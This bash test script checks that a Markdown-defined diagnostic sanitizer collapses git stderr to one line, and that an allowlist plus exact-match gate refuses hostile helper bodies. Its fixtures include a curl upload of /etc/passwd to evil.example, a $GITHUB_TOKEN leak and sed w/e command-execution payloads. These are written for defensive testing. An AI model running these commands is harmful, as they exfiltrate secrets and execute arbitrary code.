#!/usr/bin/env bash
# enrich-outcome-tokens.test.sh — Verify enrich.md's BLOCKED tokens cannot be
# split across lines by embedded git/gh stderr.
# Usage: bash ralph/skills/caretake/__tests__/enrich-outcome-tokens.test.sh
# Exit 0 = all pass; exit 1 = at least one failure.
#
# Does NOT invoke caretake --mode enrich (it has no Stop hook and mutates git/
# GitHub state) — parses modes/enrich.md and outcome-tokens.md, and actually
# evaluates the `sanitize_diag()` helper extracted from the doc's own fenced
# bash block to prove it collapses a multiline diagnostic to one line.
#
# Regression target: CodeRabbit review 2026-07-27T14:20:52Z on PR #1620 —
# "Keep failure diagnostics out of multiline terminal tokens" (enrich.md:160).
# The terminal token is the LAST LINE of the transcript (outcome-tokens.md §
# file-level invariant) and must stay verbatim-parseable; embedding raw
# multiline `git`/`gh` stderr in an `ENRICH BLOCKED ...: <stderr>` token would
# split it across several physical lines and break that read.

set -uo pipefail

PASS=0
FAIL=0

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/../../../.." && pwd)"
ENRICH="${REPO_ROOT}/ralph/skills/caretake/modes/enrich.md"
OUTCOME_TOKENS="${REPO_ROOT}/ralph/skills/caretake/outcome-tokens.md"

ok()   { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; echo "      expected: $2"; echo "      got:      $3"; FAIL=$((FAIL + 1)); }

# ── 1. Files exist ──────────────────────────────────────────────────────────

if [[ -f "$ENRICH" ]]; then
  ok "modes/enrich.md exists"
else
  fail "modes/enrich.md exists" "file present" "not found at ${ENRICH}"
fi

if [[ -f "$OUTCOME_TOKENS" ]]; then
  ok "outcome-tokens.md exists"
else
  fail "outcome-tokens.md exists" "file present" "not found at ${OUTCOME_TOKENS}"
fi

# ── 2. enrich.md defines sanitize_diag() ────────────────────────────────────

if grep -q 'sanitize_diag()' "$ENRICH"; then
  ok "modes/enrich.md defines sanitize_diag()"
else
  fail "sanitize_diag() defined in modes/enrich.md" "function definition present" "not found"
fi

# ── 3. Extract the helper, ALLOWLIST it, then run it in an isolated shell —  ─
#      prove it collapses a real multiline diagnostic (git push stderr) to one
#      line, without ever letting Markdown content execute in this shell.
#
# CodeRabbit (PR #1620, 2026-07-27): the previous version ran `eval "$extracted"`
# directly, so any content-only edit to modes/enrich.md executed arbitrary shell
# in every environment that ran this test (ast-grep eval-on-variable-bash,
# CWE-78). Behavioral proof is still worth having — a structural grep cannot
# tell a working `tr`/`cut` pipeline from a broken one — so the execution is
# kept but fenced two ways, which is the remediation the rule itself names
# ("restrict input to a validated allowlist before running it"):
#
#   1. ALLOWLIST. The extracted body must consist only of the shape this helper
#      is allowed to have: a `printf`-fed pipeline of tr/cut/sed. Any command
#      substitution, backtick, redirection, `eval`, or unlisted command fails
#      the test instead of running.
#   2. CANONICAL MATCH. The allowlist alone is not enough, because an
#      allowlisted command can itself take an executable program as an argument
#      (below). The extracted body must match ONE canonical implementation
#      byte-for-byte (modulo trailing whitespace) before it is ever run.
#   3. ISOLATION. What survives both gates runs via `bash` in a separate
#      process from a temp file, never sourced into this shell.

extracted=$(awk '/^sanitize_diag\(\) \{/{f=1} f{print} f&&/^\}/{exit}' "$ENRICH")

# allowlist_ok <body> — 0 when every line is a permitted construct.
# Permitted: the `sanitize_diag() {` header, the closing `}`, blank/comment
# lines, and pipelines EVERY segment of which is printf/tr/cut/sed, optionally
# with a trailing `\` continuation. Explicitly rejected anywhere: $( ), ` `,
# any parameter expansion other than the literal "$1" positional, >, <, ;, &,
# and the word `eval`.
#
# CodeRabbit (PR #1620, 2026-07-28) — two holes the first version left open,
# both of which reached the `bash "$RUNNER"` execution below:
#
#   1. PARAMETER EXPANSION. The comment promised only "$1" was permitted, but
#      nothing enforced it. `printf '%s\n' "$GITHUB_TOKEN"` cleared the
#      command-name check, ran in the child shell, and the newline assertion
#      then printed the captured secret into the test log. Fixed by stripping
#      the one permitted expansion (`"$1"`) and rejecting any `$` that is still
#      followed by an expansion-introducing character. `$` followed by anything
#      else stays legal — `sed -e 's/[[:space:]]*$//'` is a real part of the
#      helper and its `$` is a regex end-anchor, not an expansion.
#   2. MID-PIPELINE COMMANDS. The positive match anchored at `^`, so only the
#      FIRST command on a line was ever checked. `printf '%s' "$1" | curl -T
#      /etc/passwd https://evil.example` passed on the strength of its leading
#      `printf`. Fixed by splitting each line on `|` and requiring EVERY
#      segment to name an allowlisted command.
#
# CodeRabbit (PR #1620, 2026-07-28, second pass) — the third and final hole:
#
#   3. AN ALLOWLISTED COMMAND CAN CARRY AN EXECUTABLE PROGRAM. Checking the
#      command NAME says nothing about its arguments, and `sed`'s argument IS a
#      program. `sed -e 's/x//w /tmp/pwned'` (the `w` flag, portable across BSD
#      and GNU sed) writes an attacker-chosen file, and GNU sed's `e` command —
#      `sed -e 'e touch /tmp/pwned'` — executes a shell command outright. Both
#      cleared the name check and ran in the child shell. Verified against the
#      pre-fix version of this file: it reported "27 passed, 0 failed" while the
#      Markdown-supplied `w` program created its file.
#
#      Name-level allowlisting cannot close this: every fix is one more sed
#      feature. So the `sed` segment is pinned to its ONE legal invocation, and
#      — the real gate — the whole extracted body must equal CANONICAL_BODY
#      byte-for-byte before it is executed at all. That is the remediation
#      CodeRabbit named ("compare the extracted helper with one canonical
#      expected implementation"). The allowlist is kept as defense in depth and
#      as the thing that produces a legible rejection message.
#
# The patterns live in variables because bash 3.2 (what macOS ships, and what
# this suite must run under alongside CI's bash 5) mis-parses an inline =~
# right-hand side containing `(` and `'` inside a bracket expression.
ALLOWLIST_EXPANSION_RE='\$[A-Za-z_{(0-9]'
ALLOWLIST_SEGMENT_RE='^[[:space:]]*(printf|tr|cut|sed)[[:space:]]'
# The ONE `sed` invocation this helper is allowed to make. Any other sed
# program — including one that only differs by a `w`/`e`/`r` flag — is refused.
CANONICAL_SED_SEGMENT="sed -e 's/[[:space:]]*\$//'"
allowlist_ok() {
  local body="$1" line remainder rest seg
  while IFS= read -r line; do
    [[ -z "${line//[[:space:]]/}" ]] && continue
    [[ "$line" == 'sanitize_diag() {' || "$line" == '}' ]] && continue
    [[ "$line" =~ ^[[:space:]]*# ]] && continue
    # Dangerous constructs, checked before the positive match so a permitted
    # command name cannot smuggle one in.
    if [[ "$line" == *'$('* || "$line" == *'`'* || "$line" == *';'* \
       || "$line" == *'>'* || "$line" == *'<'* || "$line" == *'&'* \
       || "$line" == *'eval'* ]]; then
      echo "      rejected line (unsafe construct): $line" >&2
      return 1
    fi
    # Hole 1: only the literal "$1" positional may expand. Strip it, then any
    # remaining `$` that introduces an expansion (name, ${...}, $((...)), $'...')
    # is a reject. A `$` followed by anything else is inert text.
    remainder=${line//\"\$1\"/}
    if [[ "$remainder" =~ $ALLOWLIST_EXPANSION_RE ]] || [[ "$remainder" == *\$\'* ]]; then
      echo "      rejected line (parameter expansion other than \"\$1\"): $line" >&2
      return 1
    fi
    # Hole 2: every pipeline segment, not just the first, must be allowlisted.
    rest=${line%\\}
    while IFS= read -r seg; do
      [[ -z "${seg//[[:space:]]/}" ]] && continue
      if [[ ! "$seg" =~ $ALLOWLIST_SEGMENT_RE ]]; then
        echo "      rejected pipeline segment (command not on allowlist): $seg" >&2
        echo "      in line: $line" >&2
        return 1
      fi
      # Hole 3: an allowlisted command name says nothing about its arguments,
      # and sed's argument is a PROGRAM (`w file` writes, GNU `e cmd` execs).
      # Pin sed to its one legal invocation; trim surrounding whitespace first.
      trimmed="${seg#"${seg%%[![:space:]]*}"}"
      trimmed="${trimmed%"${trimmed##*[![:space:]]}"}"
      if [[ "$trimmed" == sed* && "$trimmed" != "$CANONICAL_SED_SEGMENT" ]]; then
        echo "      rejected sed program (not the one canonical invocation): $trimmed" >&2
        return 1
      fi
    done < <(printf '%s\n' "$rest" | tr '|' '\n')
  done <<< "$body"
  return 0
}

# ── The canonical implementation ────────────────────────────────────────────
# The ONE body this test will execute. Extracted content that does not match
# this byte-for-byte (after stripping trailing whitespace per line) is reported
# and NOT run — no Markdown-supplied program of any shape reaches `bash`.
#
# Deliberate trade-off: editing sanitize_diag() in modes/enrich.md turns this
# test red until the canonical copy below is updated in the same commit. That is
# the point — a behavioral change to a helper whose output feeds a terminal
# token should be a reviewed, two-file change, not something a doc edit can do
# silently.
CANONICAL_BODY="sanitize_diag() {
  printf '%s' \"\$1\" | tr '\\n\\r' '  ' | tr -s '[:space:]' ' ' | cut -c1-300 \\
    | sed -e 's/[[:space:]]*\$//'
}"

# normalize <text> — strip trailing whitespace from every line, so an invisible
# trailing space in the Markdown is a diff to fix, not a false red.
normalize() { printf '%s\n' "$1" | sed -e 's/[[:space:]]*$//'; }

# canonical_ok <body> — 0 when the body IS the canonical implementation.
canonical_ok() {
  [[ "$(normalize "$1")" == "$(normalize "$CANONICAL_BODY")" ]]
}

# ── 3a. The allowlist itself is tested, against payloads that reach execution ─
# A guard that has never been shown to reject anything is not a guard. Each
# fixture below is a body that the PRE-tightening allowlist ACCEPTED and then
# handed to `bash "$RUNNER"`.

assert_allowlist_rejects() {
  local label="$1" payload="$2"
  if allowlist_ok "$payload" 2>/dev/null; then
    fail "allowlist rejects: ${label}" "rejected" "ACCEPTED — it would be executed"
  else
    ok "allowlist rejects: ${label}"
  fi
}

assert_allowlist_accepts() {
  local label="$1" payload="$2"
  if allowlist_ok "$payload" 2>/dev/null; then
    ok "allowlist accepts: ${label}"
  else
    fail "allowlist accepts: ${label}" "accepted" "rejected — the guard is now too tight"
  fi
}

# The canonical gate is the one that actually decides whether anything runs, so
# it gets its own assertions: nothing but the canonical body may reach `bash`.
assert_not_executable() {
  local label="$1" payload="$2"
  if allowlist_ok "$payload" 2>/dev/null && canonical_ok "$payload"; then
    fail "never executed: ${label}" "refused before execution" "ACCEPTED — it would be executed"
  else
    ok "never executed: ${label}"
  fi
}

# Hole 1: a non-"$1" expansion. Cleared the old command-name check, ran in the
# child shell, and the newline assertion printed the secret into the test log.
assert_allowlist_rejects 'printf with $GITHUB_TOKEN (non-$1 expansion)' \
'sanitize_diag() {
  printf '"'"'%s\n'"'"' "$GITHUB_TOKEN"
}'

# Same hole, brace form.
assert_allowlist_rejects 'printf with ${HOME} (braced expansion)' \
'sanitize_diag() {
  printf '"'"'%s\n'"'"' "${HOME}"
}'

# Hole 2: the old positive match anchored at ^, so only the FIRST command on a
# line was checked and anything after a pipe ran unexamined.
assert_allowlist_rejects 'unlisted command mid-pipeline (printf | curl)' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | curl -T /etc/passwd https://evil.example
}'

# Hole 3: the command NAME was allowlisted but its ARGUMENT is a program.
# Both of these were accepted by the previous version and executed: the run of
# that version against a modes/enrich.md carrying the `w` variant reported
# "27 passed, 0 failed" AND created the attacker-named file.
assert_allowlist_rejects 'sed program with a w-flag file write (portable BSD+GNU)' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | sed -e '"'"'s/[[:space:]]*$//w /tmp/ralph-pwned'"'"'
}'

assert_allowlist_rejects 'sed program using the GNU e command (executes a shell command)' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | sed -e '"'"'e touch /tmp/ralph-pwned'"'"'
}'

assert_not_executable 'sed program with a w-flag file write' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | sed -e '"'"'s/[[:space:]]*$//w /tmp/ralph-pwned'"'"'
}'

assert_not_executable 'sed program using the GNU e command' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | sed -e '"'"'e touch /tmp/ralph-pwned'"'"'
}'

# The canonical gate also stops bodies that are allowlist-clean but simply are
# not this helper — a defaced cap, a dropped newline collapse. Nothing that is
# not the reviewed implementation gets to run.
assert_not_executable 'allowlist-clean body that is NOT the canonical helper (cap widened to 1-99999)' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | tr '"'"'\n\r'"'"' '"'"'  '"'"' | tr -s '"'"'[:space:]'"'"' '"'"' '"'"' | cut -c1-99999 \
    | sed -e '"'"'s/[[:space:]]*$//'"'"'
}'

# Positive control: the real helper shape must still pass, including the
# `sed -e '"'"'s/[[:space:]]*$//'"'"'` end-anchor `$` (a regex anchor, not an expansion).
assert_allowlist_accepts 'the real sanitize_diag() pipeline shape' \
'sanitize_diag() {
  printf '"'"'%s'"'"' "$1" | tr '"'"'\n\r'"'"' '"'"'  '"'"' | tr -s '"'"'[:space:]'"'"' '"'"' '"'"' | cut -c1-300 \
    | sed -e '"'"'s/[[:space:]]*$//'"'"'
}'

if [[ -z "$extracted" ]]; then
  fail "sanitize_diag() body extracted from modes/enrich.md" "non-empty function body" "empty or not found"
elif ! allowlist_ok "$extracted"; then
  fail "sanitize_diag() body is allowlist-clean" \
    "only printf/tr/cut/sed pipeline segments, no substitution or redirection" \
    "an unsafe or unrecognized construct (see rejected line above)"
elif ! canonical_ok "$extracted"; then
  fail "sanitize_diag() body matches the canonical implementation" \
    "byte-identical to CANONICAL_BODY in this test" \
    "$(diff <(normalize "$CANONICAL_BODY") <(normalize "$extracted") | head -20)"
else
  ok "sanitize_diag() body extracted from modes/enrich.md"
  ok "sanitize_diag() body is allowlist-clean (no substitution, redirection, or eval)"
  ok "sanitize_diag() body matches the canonical implementation byte-for-byte"

  # Isolation: run the allowlisted body in its own bash process. "$1" is the
  # diagnostic under test; nothing from enrich.md enters this shell.
  RUNNER="$(mktemp)"
  trap 'rm -f "$RUNNER"' EXIT
  printf '%s\n\nsanitize_diag "$1"\n' "$extracted" > "$RUNNER"

  run_sanitize() { bash "$RUNNER" "$1"; }

  multiline_input='error: failed to push some refs
hint: Updates were rejected because the remote contains work
hint: that you do not have locally.'

  result="$(run_sanitize "$multiline_input")"
  line_count=$(printf '%s' "$result" | wc -l | tr -d '[:space:]')

  if [[ "$line_count" -eq 0 ]]; then
    ok "sanitize_diag() collapses a 3-line diagnostic to a single line"
  else
    fail "sanitize_diag() output line count" "0 embedded newlines" "${line_count} embedded newline(s): ${result}"
  fi

  if [[ "$result" == *$'\n'* ]]; then
    fail "sanitize_diag() output has no literal newline byte" "no \\n in output" "found \\n in: ${result}"
  else
    ok "sanitize_diag() output has no literal newline byte"
  fi

  long_input=$(printf 'x%.0s' {1..500})
  capped="$(run_sanitize "$long_input")"
  capped_len=${#capped}
  if [[ "$capped_len" -le 300 ]]; then
    ok "sanitize_diag() caps output length (<=300 chars; got ${capped_len})"
  else
    fail "sanitize_diag() length cap" "<=300 chars" "${capped_len} chars"
  fi
fi

# ── 4. Every ENRICH BLOCKED *-failed printf routes its diagnostic through   ─
#      sanitize_diag() — not the raw ${..._err} variable directly.

check_sanitized_token() {
  local label="$1"
  local pattern="$2"
  if grep -qE "$pattern" "$ENRICH"; then
    ok "modes/enrich.md sanitizes diagnostic for: ${label}"
  else
    fail "modes/enrich.md sanitizes diagnostic for: ${label}" "pattern '${pattern}' found" "not found"
  fi
}

check_sanitized_token "checkout-main-failed" 'checkout-main-failed: \$\(sanitize_diag "\$checkout_err"\)'
check_sanitized_token "stage-failed"         'stage-failed: \$\(sanitize_diag "\$add_err"\)'
check_sanitized_token "commit-failed"        'commit-failed: \$\(sanitize_diag "\$commit_err"\)'
check_sanitized_token "push-failed"          'push-failed: \$\(sanitize_diag "\$push_err"\)'
check_sanitized_token "pr-create-failed"     'pr-create-failed: \$\(sanitize_diag "\$pr_err"\)'
check_sanitized_token "pr-create-failed (lookup fallback)" 'lookup failed: \$\(sanitize_diag "\$\{view_err:-empty url\}"\)'

# Negative check: no raw `${..._err}` interpolation should remain directly
# inside a printed `ENRICH BLOCKED ...:` token line (that is exactly the
# multiline-token defect this test guards against).
raw_leak=$(grep -nE 'ENRICH BLOCKED [a-z-]+-failed: \$\{[a-z_]+_err\}"' "$ENRICH" || true)
if [[ -z "$raw_leak" ]]; then
  ok "no raw \${..._err} interpolated directly into an ENRICH BLOCKED token"
else
  fail "no raw \${..._err} in ENRICH BLOCKED token" "no matches" "$raw_leak"
fi

# ── 4b. Every state-changing git command in §Step 4 is exit-checked ─────────
# CodeRabbit (PR #1620, 2026-07-27): `git add` was the one unchecked command
# left in an otherwise fully-checked block. A failed stage leaves the index as
# it was, the following `git commit` then succeeds against a STALE index, and
# the mode reports `ENRICHED <N> (PR <url>)` for findings that never got
# staged — unrecoverable, because §Step 3 already flipped those files to
# `status: forming`.

check_guarded_command() {
  local label="$1" pattern="$2"
  if grep -qE "$pattern" "$ENRICH"; then
    ok "modes/enrich.md exit-checks: ${label}"
  else
    fail "modes/enrich.md exit-checks: ${label}" "guarded form '${pattern}' found" "not found (unchecked command)"
  fi
}

check_guarded_command "git add"      'if ! add_err=\$\(git add -- "\$\{SELECTED_FILES\[@\]\}" 2>&1\); then'
check_guarded_command "git commit"   'if ! commit_err=\$\(git commit '
check_guarded_command "git push"     'if ! push_err=\$\(git push origin '
check_guarded_command "git checkout" 'if ! checkout_err=\$\(git checkout main 2>&1\); then'

# Negative: no bare `git add` line may remain in the doc's bash blocks.
bare_add=$(grep -nE '^[[:space:]]*git add ' "$ENRICH" || true)
if [[ -z "$bare_add" ]]; then
  ok "no unchecked bare 'git add' remains in modes/enrich.md"
else
  fail "no unchecked bare 'git add' in modes/enrich.md" "no matches" "$bare_add"
fi

# ── 4c. sanitize_diag() is DEFINED before its first USE ─────────────────────
# CodeRabbit (PR #1620, 2026-07-28): the helper lived in §Step 4 while §Step 2b's
# branch-setup failure paths already called it. In a real run that is a
# `command not found`, an empty diagnostic, and an
# `ENRICH SKIPPED branch-setup-failed: fetch-main:` token missing the one thing
# it exists to carry. Ordering in this doc is executable, so assert it.

# Only real CALL SITES count, not the prose that names the helper: match the
# `printf … "$(sanitize_diag …)"` token-emitting form specifically.
def_line=$(grep -n '^sanitize_diag() {' "$ENRICH" | head -1 | cut -d: -f1)
use_line=$(grep -nE '^[[:space:]]*printf .*\$\(sanitize_diag ' "$ENRICH" | head -1 | cut -d: -f1)

if [[ -n "$def_line" && -n "$use_line" && "$def_line" -lt "$use_line" ]]; then
  ok "sanitize_diag() is defined (line ${def_line}) before its first use (line ${use_line})"
else
  fail "sanitize_diag() defined before first use" \
    "definition line < first-use line" \
    "definition at ${def_line:-none}, first use at ${use_line:-none}"
fi

# ── 4d. An empty selection must not strand already-committed enrichment ─────
# CodeRabbit (PR #1620, 2026-07-28): after a push or PR-create failure the
# enriched files are `status: forming` on the branch but still `draft` on main,
# so §Step 2 re-selects them and §Step 3's post-checkout re-read drops them all.
# An unconditional `Queue empty.` there never retries the push or the idempotent
# PR create — on any future heartbeat. The commit is the only copy.

if grep -qF 'origin/main..$BRANCH' "$ENRICH"; then
  ok "modes/enrich.md checks the branch for unpublished commits before 'Queue empty.'"
else
  fail "pending-commit check before 'Queue empty.'" \
    "a rev-list against origin/main..\$BRANCH in modes/enrich.md" \
    "not found — an empty selection would strand a committed-but-unpushed pass"
fi

if grep -q 'pending_commits' "$ENRICH" && grep -q 'ENRICH RECOVERED' "$ENRICH"; then
  ok "modes/enrich.md routes pending branch work to the publish/recovery path"
else
  fail "recovery routing for pending branch work" \
    "a pending_commits branch emitting ENRICH RECOVERED" "not found"
fi

if grep -q 'ENRICH RECOVERED (PR <url>)' "$OUTCOME_TOKENS"; then
  ok "outcome-tokens.md documents the ENRICH RECOVERED token"
else
  fail "outcome-tokens.md ENRICH RECOVERED token" "token documented" "not found"
fi

# ── 5. outcome-tokens.md's canonical contract documents sanitized diagnostics ─

if grep -q '<sanitized-stderr>' "$OUTCOME_TOKENS"; then
  ok "outcome-tokens.md uses <sanitized-stderr> placeholder for ENRICH BLOCKED tokens"
else
  fail "outcome-tokens.md <sanitized-stderr> placeholder" "found" "not found"
fi

if grep -q 'ENRICH BLOCKED stage-failed: <sanitized-stderr>' "$OUTCOME_TOKENS"; then
  ok "outcome-tokens.md documents the ENRICH BLOCKED stage-failed token"
else
  fail "outcome-tokens.md stage-failed token" "'ENRICH BLOCKED stage-failed: <sanitized-stderr>' present" "not found"
fi

unsanitized_leak=$(grep -nE 'ENRICH BLOCKED [a-z-]+-failed: <stderr>' "$OUTCOME_TOKENS" || true)
if [[ -z "$unsanitized_leak" ]]; then
  ok "outcome-tokens.md has no stale <stderr> (unsanitized) ENRICH BLOCKED token"
else
  fail "no stale <stderr> ENRICH BLOCKED token in outcome-tokens.md" "no matches" "$unsanitized_leak"
fi

# ── summary ──────────────────────────────────────────────────────────────────

echo ""
echo "Results: ${PASS} passed, ${FAIL} failed"
if [[ "$FAIL" -eq 0 ]]; then
  exit 0
else
  exit 1
fi
